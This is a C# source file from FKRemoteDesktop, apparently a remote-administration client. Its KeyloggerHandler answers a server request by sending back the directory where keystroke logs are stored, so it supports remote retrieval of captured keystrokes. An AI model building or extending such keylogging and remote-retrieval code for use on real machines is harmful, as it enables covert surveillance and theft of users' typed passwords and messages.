using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Message.SubMessages;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class KeyloggerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectory msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: GetKeyloggerLogsDirectory");
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
        {
            client.Send(new GetKeyloggerLogsDirectoryResponse { LogsDirectory = SettingsFromClient.LOGSPATH });
        }
    }
}